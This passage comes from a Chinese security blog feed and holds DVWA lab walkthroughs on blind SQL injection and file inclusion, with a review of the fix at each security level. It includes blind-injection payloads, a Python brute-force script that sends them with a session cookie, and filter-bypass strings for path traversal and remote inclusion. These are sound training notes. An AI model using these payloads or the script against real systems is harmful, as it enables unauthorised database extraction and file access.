<span class="literal">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;和七中的普通sql注入不同，这里并没有使用mysqli_error返回错误信息。无论sql语句是错误还是正确，只能得到exists或者missing两种结果。<br>&emsp;&emsp;DVWA中只有如下两种显示：</p>
<div align="center"><img src="/2021/06/28/DVWA-%E5%85%AB-%EF%BC%9ASQL-Injection%EF%BC%88Blind%E7%9B%B2%E6%B3%A8%EF%BC%89/1.png" width="350" height="122"></div>

<p><br></p>
<div align="center"><img src="/2021/06/28/DVWA-%E5%85%AB-%EF%BC%9ASQL-Injection%EF%BC%88Blind%E7%9B%B2%E6%B3%A8%EF%BC%89/2.png" width="350" height="115"></div>

<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p><strong>获取数据库名长度</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and length(database())&gt;5 #    显示MISSING</span></span><br><span class="line">1&#x27; and length(database())&gt;3 #    显示exists</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and length(database())=4 #    显示exists</span></span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;这里使用length函数获取长度，与设定数值比较，一步步测试，得到库名长度为4。</p>
<p><strong>获取数据库名</strong></p>
<p>&emsp;&emsp;mysql中有字符串函数 substr()，可以从指定位置开始截取指定长度的字符串，其参数为substr(string string,num start,num length)。其中string为字符串，start为起始位置，length为长度。<br>&emsp;&emsp;因此可以使用如下语句测试每个字符：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and substr(database(),1,1)=&#x27;</span>a<span class="string">&#x27;#   测试第一个字符是否为a</span></span><br><span class="line">1&#x27; and substr(database(),1,1)=&#x27;b&#x27;#   测试第一个字符是否为b</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;mysql中也有ascii()函数，可以返回字符的ascii码值，也可使用如下语句来测试：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and ascii(substr(database(),1,1))&gt;80#</span></span><br><span class="line">1&#x27; and ascii(substr(database(),1,1))&lt;120#</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and ascii(substr(database(),1,1))=100#</span></span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;最后获取到当前连接数据库的名称为：dvwa。</p>
<p><strong>获取数据库表名</strong></p>
<p>&emsp;&emsp;通过信息数据库 information_schema 可以得到数据库中的表、字段等信息，具体如何获取请参考文章<a href="https://yiwenzhe.com/2021/06/28/DVWA-%E4%B8%83-%EF%BC%9ASQL-Injection%EF%BC%88sql%E6%B3%A8%E5%85%A5%EF%BC%89" target="_blank">DVWA(七)：SQL-Injection（sql注入）</a></p>
<p>&emsp;&emsp;代码如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">猜测表的个数</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and (select count(table_name) from information_schema.tables where table_schema=database())&gt;10 # </span></span><br><span class="line">1&#x27; and (select count(table_name) from information_schema.tables where table_schema=database())&lt;5 # </span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and (select count(table_name) from information_schema.tables where table_schema=database())=2 # </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">猜测表名长度</span></span><br><span class="line">1&#x27; and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))&gt;10 #</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 #</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">猜测第一个表名</span></span><br><span class="line">1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=103 #</span><br><span class="line">猜测第二个表名</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))=117 #</span></span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;最后获取到表个数为2，表名分别为guestbook和users。</p>
<p><strong>获取表中字段名</strong></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">猜测字段个数</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and (select count(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;</span>users<span class="string">&#x27;)&gt;10 #</span></span><br><span class="line">1&#x27; and (select count(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;)=8 #</span><br><span class="line"></span><br><span class="line">猜测字段长度</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and length(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;</span>users<span class="string">&#x27; limit 0,1),1))=7 #</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">猜测字段名称</span></span><br><span class="line">1&#x27; and ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1),1,1))=117 #</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;就算猜到了字段名称，字段具体值要一个个猜中还是很困难的，只能凭借用户习惯和运气来测试，这也是sql盲注的难点。sql盲注及其耗费时间，往往需要编写脚本来批量测试。这里给出一个python脚本如下（脚本来源<a href="https://blog.csdn.net/qq_42181428/article/details/88075784" target="_blank">以dvwa为例学习简单sql布尔盲注的详细脚本</a>）：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">s = requests.Session()</span><br><span class="line">#payload应该包括所有大小写字母和其他字符，这里是简化使用</span><br><span class="line">payloads = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz1234567890&#x27;</span> </span><br><span class="line">#此处提交需要用户登录的cookie，可以使用burpsuit抓取</span><br><span class="line">headers = &#123;<span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;security=low; PHPSESSID=1rgudn49lotqe6hedvv6uu7ioj&#x27;</span>&#125;</span><br><span class="line">#url为dvwa中sql盲注地址</span><br><span class="line">url=<span class="string">&quot;http://192.168.71.1/DVWA/vulnerabilities/sqli_blind/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    databaseLen_payload = <span class="string">&#x27;?id=1\&#x27; and length(database())=&#x27;</span>+str(j)+<span class="string">&#x27; %23&amp;Submit=Submit#&#x27;</span></span><br><span class="line">    # 所有payload里的注释#要用url编码%23表示，因为这是直接添加在url里的</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;User ID exists in the database.&#x27;</span> <span class="keyword">in</span> s.get(url+databaseLen_payload, headers=headers).text:</span><br><span class="line">        databaseLen = j</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(<span class="string">&#x27;database_lenth: &#x27;</span>+str(databaseLen))</span><br><span class="line">databse_name = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,databaseLen+<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> payloads:</span><br><span class="line">        databse_payload = <span class="string">&#x27;?id=1\&#x27; and substr(database(),&#x27;</span>+str(j)+<span class="string">&#x27;,1)=\&#x27;&#x27;</span>+str(i)+<span class="string">&#x27;\&#x27; %23&amp;Submit=Submit#&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;User ID exists in the database.&#x27;</span> <span class="keyword">in</span> s.get(url+databse_payload, headers=headers).text:</span><br><span class="line">            databse_name += i</span><br><span class="line">print(<span class="string">&#x27;database_name: &#x27;</span>+databse_name)</span><br><span class="line">        </span><br><span class="line"># 3.爆破表的个数</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    tableNum_payload = <span class="string">&#x27;?id=1\&#x27; and (select count(table_name) from information_schema.tables where table_schema=database())=&#x27;</span>+str(j)+<span class="string">&#x27; %23&amp;Submit=Submit#&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;User ID exists in the database.&#x27;</span> <span class="keyword">in</span> s.get(url+tableNum_payload, headers=headers).text:</span><br><span class="line">        tableNum = j</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(<span class="string">&#x27;tableNum: &#x27;</span>+str(tableNum))</span><br><span class="line"></span><br><span class="line"># 4.爆出所有的表名</span><br><span class="line"># (1)爆出各个表名的长度</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,tableNum):</span><br><span class="line">    table_name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">        tableLen_payload = <span class="string">&#x27;?id=1\&#x27; and length(substr((select table_name from information_schema.tables where table_schema=database() limit &#x27;</span>+str(j)+<span class="string">&#x27;,1),1))=&#x27;</span>+str(i)+<span class="string">&#x27; %23&amp;Submit=Submit#&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;User ID exists in the database.&#x27;</span> <span class="keyword">in</span> s.get(url+tableLen_payload, headers=headers).text:</span><br><span class="line">            tableLen = i</span><br><span class="line">            print(<span class="string">&#x27;table&#x27;</span>+str(j+<span class="number">1</span>)+<span class="string">&#x27;_length: &#x27;</span>+str(tableLen))</span><br><span class="line">          </span><br><span class="line">            # (2)内部循环爆破每个表的表名</span><br><span class="line">            <span class="keyword">for</span> m <span class="keyword">in</span> range(<span class="number">1</span>,tableLen+<span class="number">1</span>):</span><br><span class="line">                <span class="keyword">for</span> n <span class="keyword">in</span> payloads:</span><br><span class="line">                    table_payload = <span class="string">&#x27;?id=1\&#x27; and substr((select table_name from information_schema.tables where table_schema=database() limit &#x27;</span>+str(j)+<span class="string">&#x27;,1),&#x27;</span>+str(m)+<span class="string">&#x27;,1)=\&#x27;&#x27;</span>+str(n)+<span class="string">&#x27;\&#x27; %23&amp;Submit=Submit#&#x27;</span></span><br><span class="line">                    <span class="keyword">if</span> <span class="string">&#x27;User ID exists in the database.&#x27;</span> <span class="keyword">in</span> s.get(url+table_payload, headers=headers).text:</span><br><span class="line">                        table_name += n</span><br><span class="line">            print(<span class="string">&#x27;table&#x27;</span>+str(j+<span class="number">1</span>)+<span class="string">&#x27;_name: &#x27;</span>+table_name)</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;结果如下：</p>
<div align="center"><img src="/2021/06/28/DVWA-%E5%85%AB-%EF%BC%9ASQL-Injection%EF%BC%88Blind%E7%9B%B2%E6%B3%A8%EF%BC%89/3.png" width="300" height="201"></div>

<p>&emsp;&emsp;以上例子都是基于布尔的盲注，也可以使用基于时间的盲注获取信息。输入：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and if(length(database())=4,sleep(5),1 )# </span></span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;当length正确时，网页会加载至少5秒；当length错误时，网页很快就返回。如下图，可以看到延迟时间为5.02秒。</p>
<div align="center"><img src="/2021/06/28/DVWA-%E5%85%AB-%EF%BC%9ASQL-Injection%EF%BC%88Blind%E7%9B%B2%E6%B3%A8%EF%BC%89/4.png"></div>

<h1 id="安全级别Medium"><a href="#安全级别Medium" class="headerlink" title="安全级别Medium"></a>安全级别Medium</h1><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( isset( $_POST[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_POST[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line">    $id = ((isset($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $id ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    $getid  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = $id;&quot;</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $getid ); <span class="comment">// Removed &#x27;or die&#x27; to suppress mysql errors</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    $num = @mysqli_num_rows( $result ); <span class="comment">// The &#x27;@&#x27; character suppresses errors</span></span><br><span class="line">    <span class="keyword">if</span>( $num &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        echo <span class="string">&#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        echo <span class="string">&#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;中级代码中，使用POST获取传入参数，同时使用mysqli_real_escape_string来过滤一些特殊字符。所以当使用带引号的变量’dvwa’或者’users’时，可以使用16进制来代替。<br>&emsp;&emsp;中级的盲注过程和低级类似，其中中级需要POST方法提交，并注意一些字符的绕过，可参考上一篇文章<a href="https://yiwenzhe.com/2021/06/28/DVWA-%E4%B8%83-%EF%BC%9ASQL-Injection%EF%BC%88sql%E6%B3%A8%E5%85%A5%EF%BC%89" target="_blank">DVWA(七)：SQL-Injection（sql注入）</a>。</p>
<h1 id="安全级别High"><a href="#安全级别High" class="headerlink" title="安全级别High"></a>安全级别High</h1><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( isset( $_COOKIE[ <span class="string">&#x27;id&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_COOKIE[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    $getid  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27; LIMIT 1;&quot;</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $getid ); <span class="comment">// Removed &#x27;or die&#x27; to suppress mysql errors</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    $num = @mysqli_num_rows( $result ); <span class="comment">// The &#x27;@&#x27; character suppresses errors</span></span><br><span class="line">    <span class="keyword">if</span>( $num &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        echo <span class="string">&#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Might sleep a random amount 随机延时</span></span><br><span class="line">        <span class="keyword">if</span>( rand( <span class="number">0</span>, <span class="number">5</span> ) == <span class="number">3</span> ) &#123;</span><br><span class="line">            sleep( rand( <span class="number">2</span>, <span class="number">4</span> ) );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// User wasn&#x27;t found, so the page wasn&#x27;t!</span></span><br><span class="line">        header( $_SERVER[ <span class="string">&#x27;SERVER_PROTOCOL&#x27;</span> ] . <span class="string">&#x27; 404 Not Found&#x27;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        echo <span class="string">&#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;查询语句中使用Limit 1限制结果为一条，可以直接使用#注释该限制。同时在查询失败时，会使用sleep随机延时0-5秒，所以不能使用基于时间的盲注，可以使用基于布尔的盲注，和安全级别low过程类似。</p>
<h1 id="安全级别Impossible"><a href="#安全级别Impossible" class="headerlink" title="安全级别Impossible"></a>安全级别Impossible</h1><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( isset( $_GET[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">&#x27;user_token&#x27;</span> ], $_SESSION[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_GET[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Was a number entered?</span></span><br><span class="line">    <span class="keyword">if</span>(is_numeric( $id )) &#123;</span><br><span class="line">        <span class="comment">// Check the database</span></span><br><span class="line">        $data = $db-&gt;prepare( <span class="string">&#x27;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#x27;</span> );</span><br><span class="line">        $data-&gt;bindParam( <span class="string">&#x27;:id&#x27;</span>, $id, <span class="attr">PDO</span>::PARAM_INT );</span><br><span class="line">        $data-&gt;execute();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Get results</span></span><br><span class="line">        <span class="keyword">if</span>( $data-&gt;rowCount() == <span class="number">1</span> ) &#123;</span><br><span class="line">            <span class="comment">// Feedback for end user</span></span><br><span class="line">            echo <span class="string">&#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// User wasn&#x27;t found, so the page wasn&#x27;t!</span></span><br><span class="line">            header( $_SERVER[ <span class="string">&#x27;SERVER_PROTOCOL&#x27;</span> ] . <span class="string">&#x27; 404 Not Found&#x27;</span> );</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Feedback for end user</span></span><br><span class="line">            echo <span class="string">&#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;Impossible代码中使用 Anti-CSRF token防止CSRF攻击，使用is_numeric( $id )判断输入的id是数字还是字符串，只有输入为数字才执行sql查询。</p>
<p>&emsp;&emsp;使用db-&gt;prepare和data-&gt;bindParam预处理sql语句，使得传入的变量被固定为数据，因此也就不会当做代码执行。最后验证sql语句查询结果数目$data-&gt;rowCount() == 1，只有为一条时才输出，有效防止爆库。</p>]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>DVWA</tag>
        <tag>sql盲注</tag>
      </tags>
  </entry>
  <entry>
    <title>DVWA(四)：File-Inclusion（文件包含）</title>
    <url>/2021/07/03/DVWA-%E5%9B%9B-%EF%BC%9AFile-Inclusion%EF%BC%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%89/</url>
    <content><![CDATA[<!-- excerpt --><br><!-- toc --></p>
<p>&emsp;&emsp;当我们在编写较大工程时，往往会将功能函数封装在单独的文件中，方便多次调用，调用文件的过程就是文件包含。如果不对文件来源进行审查，可能就会导致任意文件读取或者任意命令执行，这就是文件包含漏洞。<br>&emsp;&emsp;文件包含漏洞分为本地文件包含漏洞与远程文件包含漏洞。在php中alLow_url_fopen选项开启后，服务器允许包含远程的文件，就会造成远程文件包含漏洞。<br>&emsp;&emsp;php常见文件包含函数如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">Include()</span><br><span class="line"><span class="comment">/*当包含并运行指定文件时，包含的外部文件发生错误，系统会给出警告，但整个php文件还会继续执行。*/</span></span><br><span class="line">Require()</span><br><span class="line"><span class="comment">/*require()与 include()的区别在于 require()执行如果发生错误，函数会输出错误信息，并终止脚本的运行。*/</span></span><br><span class="line">include_once()</span><br><span class="line"><span class="comment">/*和include没有什么区别，只是在导入函数之前先检测下该文件是否被include过，如果已经执行了一遍，那么就不在进行第二次的include操作。*/</span></span><br><span class="line">require_once()</span><br><span class="line"><span class="comment">/*功能与 require()相同，区别在于当重复调用同一文件时，程序只调用一次*/</span></span><br></pre></td></tr></table></figure>
<h1 id="安全级别Low"><a href="#安全级别Low" class="headerlink" title="安全级别Low"></a>安全级别Low</h1><h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line">$file = $_GET[ <span class="string">&#x27;page&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;直接跳过GET获取page参数，未经检查和过滤，直接执行。<br>&emsp;&emsp;页面显示如下：</p>
<div align="center"><img src="/2021/07/03/DVWA-%E5%9B%9B-%EF%BC%9AFile-Inclusion%EF%BC%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%89/Low/1.png" width="350" height="89"></div>


<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>&emsp;&emsp;页面中有三个file，点击第一个文件，显示如下：</p>
<div align="center"><img src="/2021/07/03/DVWA-%E5%9B%9B-%EF%BC%9AFile-Inclusion%EF%BC%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%89/Low/2.png" width="600" height="261"></div>

<p>&emsp;&emsp;点击file1时，服务器会包含file1并执行，同时观察url，page=file1.php，因此是直接通过page传递参数，可以直接在url上修改文件路径。<br>&emsp;&emsp;在file1、2、3同文件夹下有一个隐藏文件file4.php和我自己编写的flag文件，通过page=file4.php、page=flag获取文件内容：</p>
<div align="center"><img src="/2021/07/03/DVWA-%E5%9B%9B-%EF%BC%9AFile-Inclusion%EF%BC%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%89/Low/3.png" width="350" height="99"></div>

<p><br></p>
<div align="center"><img src="/2021/07/03/DVWA-%E5%9B%9B-%EF%BC%9AFile-Inclusion%EF%BC%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%89/Low/4.png" width="500" height="152"></div>

<p>&emsp;&emsp;当文件类型为php时，文件会执行并显示信息。而不是php文件时，如上图flag，会直接显示文件内容。<br>&emsp;&emsp;如果我们知道服务器的文件路径，可以通过相对路径（如../../phpinfo.php）和绝对路径的方式包含文件。若要远程包含文件，输入完整的url路径即可：</p>
<div align="center"><img src="/2021/07/03/DVWA-%E5%9B%9B-%EF%BC%9AFile-Inclusion%EF%BC%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%89/Low/5.png" width="600" height="330"></div>

<p><br></p>
<div align="center"><img src="/2021/07/03/DVWA-%E5%9B%9B-%EF%BC%9AFile-Inclusion%EF%BC%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%89/Low/6.png" width="600" height="330"></div>

<h1 id="安全级别Medium"><a href="#安全级别Medium" class="headerlink" title="安全级别Medium"></a>安全级别Medium</h1><h2 id="源码分析-1"><a href="#源码分析-1" class="headerlink" title="源码分析"></a>源码分析</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line">$file = $_GET[ <span class="string">&#x27;page&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Input validation</span></span><br><span class="line">$file = str_replace( array( <span class="string">&quot;http://&quot;</span>, <span class="string">&quot;https://&quot;</span> ), <span class="string">&quot;&quot;</span>, $file );</span><br><span class="line">$file = str_replace( array( <span class="string">&quot;../&quot;</span>, <span class="string">&quot;..\&quot;&quot;</span> ), <span class="string">&quot;&quot;</span>, $file );</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;此处添加了一些字符过滤，将“http: //”、“https: //”、 “../”、“..\”替换为空，阻挡一些路径文件的访问。</p>
<h2 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>&emsp;&emsp;对于“../”、“..\”这样的相对路径，若知道了服务器完整的文件路径，可以使用绝对路径来代替。<br>&emsp;&emsp;可以采用复写的方式来绕过，如“ht <strong>http://</strong> tp://”，“ht <strong>https://</strong> tps://”，字符串中的“http: //”、“https: //”被替换为空，因此前后的字符串又拼接起来成http。同样也使用”…/./“、”….\”来绕过：</p>
<div align="center"><img src="/2021/07/03/DVWA-%E5%9B%9B-%EF%BC%9AFile-Inclusion%EF%BC%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%89/Medium/1.png" width="600" height="334"></div>

<p><br></p>
<div align="center"><img src="/2021/07/03/DVWA-%E5%9B%9B-%EF%BC%9AFile-Inclusion%EF%BC%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%89/Medium/2.png" width="600" height="337"></div>

<h1 id="安全级别High"><a href="#安全级别High" class="headerlink" title="安全级别High"></a>安全级别High</h1><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line">$file = $_GET[ <span class="string">&#x27;page&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Input validation</span></span><br><span class="line"><span class="keyword">if</span>( !fnmatch( <span class="string">&quot;file*&quot;</span>, $file ) &amp;&amp; $file != <span class="string">&quot;include.php&quot;</span> ) &#123;</span><br><span class="line">    <span class="comment">// This isn&#x27;t the page we want!</span></span><br><span class="line">    echo <span class="string">&quot;ERROR: File not found!&quot;</span>;</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;源码中使用了file协议，限制路径开头必须为file。<br>&emsp;&emsp;file协议是本地文件传输协议 ，主要用于访问本地计算机中的文件，就如同在Windows资源管理器中打开文件一样。 要使用file协议，基本的格式如下：file:///文件路径。<br>&emsp;&emsp;因此我们只能使用绝对路径来包含文件：</p>
<div align="center"><img src="/2021/07/03/DVWA-%E5%9B%9B-%EF%BC%9AFile-Inclusion%EF%BC%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%89/High/1.png" width="600" height="324"></div>

<h1 id="安全级别Impossible"><a href="#安全级别Impossible" class="headerlink" title="安全级别Impossible"></a>安全级别Impossible</h1><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line">$file = $_GET[ <span class="string">&#x27;page&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Only allow include.php or file&#123;1..3&#125;.php</span></span><br><span class="line"><span class="keyword">if</span>( $file != <span class="string">&quot;include.php&quot;</span> &amp;&amp; $file != <span class="string">&quot;file1.php&quot;</span> &amp;&amp; $file != <span class="string">&quot;file2.php&quot;</span> &amp;&amp; $file != <span class="string">&quot;file3.php&quot;</span> ) &#123;</span><br><span class="line">    <span class="comment">// This isn&#x27;t the page we want!</span></span><br><span class="line">    echo <span class="string">&quot;ERROR: File not found!&quot;</span>;</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;源码对文件名实行白名单机制，只有file1.php、file2.php、file3.php可以被包含，彻底修复了任意文件包含漏洞。</p>]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>DVWA</tag>
        <tag>文件包含</tag>
      </tags>
  </entry>
  <entry>
    <title>保研结束有感</title>
    <url>/2021/09/29/%E4%BF%9D%E7%A0%94%E7%BB%93%E6%9D%9F%E6%9C%89%E6%84%9F/</url>
    <content><![CDATA[<!-- excerpt --></p>
